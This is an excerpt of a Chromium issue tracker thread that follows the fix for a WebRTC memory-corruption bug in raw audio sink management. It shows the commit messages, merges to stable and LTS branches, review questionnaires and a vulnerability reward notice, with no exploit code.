    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:486421954 
    Tbr: webrtc-chromium-sheriffs-robots@google.com 
    Change-Id: I08d03ce8fbef785c81ec03479a4de30926af8d38 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7643151 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1595347}

```

---

Files:

- M `DEPS`
- M `third_party/webrtc`

---

Hash: [e3e1c94d885e76911ea3f7792cc0805cc77607f4](https://chromiumdash.appspot.com/commit/e3e1c94d885e76911ea3f7792cc0805cc77607f4)  

Date: Fri Mar 6 13:56:12 2026


---

### ch...@google.com (2026-03-07)

Security Merge Request Consideration: Requesting merge to stable (M145) because latest trunk commit (1595347) appears to be after stable branch point (1568190).
Security Merge Request Consideration: Requesting merge to beta (M146) because latest trunk commit (1595347) appears to be after beta branch point (1582197).
Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request - Manual Review: Merge review required: a commit with DEPS changes was detected.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### dr...@chromium.org (2026-03-09)

No crashes in Canary. Approving merge to M146. We don't plan more releases for M144 or M145, so removing those labels.

### dx...@google.com (2026-03-12)

Project: src  

Branch:  refs/branch-heads/7680  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/456182>

[146] Update raw audio sink management for unsignaled streams

---


Expand for full commit details
```
     
    Ensure the default raw audio sink is correctly detached when an 
    unsignaled stream is removed or promoted. Previously, when a stream 
    was deregistered, the associated ProxySink could retain a bad 
    pointer to the default sink. 
     
    This change modifies the VoiceEngine to: 
    * Explicitly clear the raw audio sink from a stream when it is 
      removed from the unsignaled stream list. 
    * Properly hand over the default sink to the next available 
      unsignaled stream if the current primary stream is deregistered. 
    * Simplify the logic for detaching the sink from the previous latest 
      stream when a new unsignaled stream is identified. 
     
    (cherry picked from commit af411f52472297833af0813b727c7b4644221f04) 
     
    Bug: chromium:486421954 
    Fixes: chromium:486421954 
    Change-Id: Ied7062e95a1749a9d8f95f77ec2b0dc81ab00ad1 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454040 
    Reviewed-by: Per Åhgren <peah@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47074} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/456182 
    Reviewed-by: Jeremy Leconte <jleconte@google.com> 
    Cr-Commit-Position: refs/branch-heads/7680@{#3} 
    Cr-Branched-From: d1972add2a63b2a528a6471d447f82e0010b5215-refs/heads/main@{#46853}

```

---

Files:

- M `media/engine/webrtc_voice_engine.cc`
- M `media/engine/webrtc_voice_engine_unittest.cc`

---

Hash: b2a90ac0037ee7187102ce2c40e5007216ca9a58  

Date: Thu Mar 5 22:12:04 2026


---

### pe...@google.com (2026-03-12)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### wf...@chromium.org (2026-03-18)

memory corruption in renderer is sev-high

### sp...@google.com (2026-03-20)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
High-quality report of demonstrated memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### pe...@google.com (2026-03-26)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2026-03-26)

1. https://webrtc-review.git.corp.google.com/c/src/+/458261
2. Low - There was no conflict. But the added unittests were not tested on the trybots. It looks like the trybot didn't support M138 branch. So, the test was removed in the chrry-picked CL.
3. 146
4. Yes, although the cherry-picked CL failed to pass the build on the trybots, but it looks like the trybots didn't support the branch. The issue has existed for many years. And, the build was fine when building chrome with the cherry-picked CL on M138 branch locally. Thus, it looks like we need to cherry-pick the CL to M138.

### an...@google.com (2026-03-31)

Merge approved for LTS-138

### dx...@google.com (2026-04-01)

Project: src  

Branch:  refs/branch-heads/7204  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/458261>

[M138] Update raw audio sink management for unsignaled streams

---


Expand for full commit details
```
     
    Ensure the default raw audio sink is correctly detached when an 
    unsignaled stream is removed or promoted. Previously, when a stream 
    was deregistered, the associated ProxySink could retain a bad 
    pointer to the default sink. 
     
    This change modifies the VoiceEngine to: 
    * Explicitly clear the raw audio sink from a stream when it is 
      removed from the unsignaled stream list. 
    * Properly hand over the default sink to the next available 
      unsignaled stream if the current primary stream is deregistered. 
    * Simplify the logic for detaching the sink from the previous latest 
      stream when a new unsignaled stream is identified. 
     
    Using no-try due to infra issues on some of the bots. 
     
    (cherry picked from commit af411f52472297833af0813b727c7b4644221f04) 
     
    No-Try: true 
    Bug: chromium:486421954 
    Fixes: chromium:486421954 
    Change-Id: Ied7062e95a1749a9d8f95f77ec2b0dc81ab00ad1 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454040 
    Reviewed-by: Per Åhgren <peah@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47074} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/458261 
    Cr-Commit-Position: refs/branch-heads/7204@{#1} 
    Cr-Branched-From: e4445e46a910eb407571ec0b0b8b7043562678cf-refs/heads/main@{#44764}

```

---

Files:

- M `media/engine/webrtc_voice_engine.cc`

---

Hash: 34ba9daafd9c7e27bcd7534b4d008b4664a9f989  

Date: Fri Mar 20 09:52:47 2026


---

### dx...@google.com (2026-04-01)

Project: src  

Branch:  refs/branch-heads/7559  

Author:  Tommi [tommi@webrtc.org](mailto:tommi@webrtc.org)  

Link:    <https://webrtc-review.googlesource.com/458302>

[M144] Update raw audio sink management for unsignaled streams

---


Expand for full commit details
```
     
    Ensure the default raw audio sink is correctly detached when an 
    unsignaled stream is removed or promoted. Previously, when a stream 
    was deregistered, the associated ProxySink could retain a bad 
    pointer to the default sink. 
     
    This change modifies the VoiceEngine to: 
    * Explicitly clear the raw audio sink from a stream when it is 
      removed from the unsignaled stream list. 
    * Properly hand over the default sink to the next available 
      unsignaled stream if the current primary stream is deregistered. 
    * Simplify the logic for detaching the sink from the previous latest 
      stream when a new unsignaled stream is identified. 
     
    Using No-Try due to configuration issues on some of the bots. 
     
    (cherry picked from commit af411f52472297833af0813b727c7b4644221f04) 
     
    No-try: true 
    Bug: chromium:486421954 
    Fixes: chromium:486421954 
    Change-Id: Ied7062e95a1749a9d8f95f77ec2b0dc81ab00ad1 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/454040 
    Reviewed-by: Per Åhgren <peah@webrtc.org> 
    Commit-Queue: Tomas Gunnarsson <tommi@webrtc.org> 
    Cr-Original-Commit-Position: refs/heads/main@{#47074} 
    Reviewed-on: https://webrtc-review.googlesource.com/c/src/+/458302 
    Cr-Commit-Position: refs/branch-heads/7559@{#3} 
    Cr-Branched-From: f680c1893f3b166b370439da52ae82d02f54969c-refs/heads/main@{#46356}

```

---

Files:

- M `media/engine/webrtc_voice_engine.cc`
- M `media/engine/webrtc_voice_engine_unittest.cc`

---

Hash: 38992ca45d5476d63b4f3b823e7c84a165348701  

Date: Thu Mar 5 22:12:04 2026


---

### qk...@google.com (2026-04-10)

Labeled 'LTS-Merge-Merged-144` because the cherry-picked CL[1] was already merged to M144 by the author.

[1] https://webrtc-review.git.corp.google.com/c/src/+/458302

### ch...@google.com (2026-06-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/486421954)*
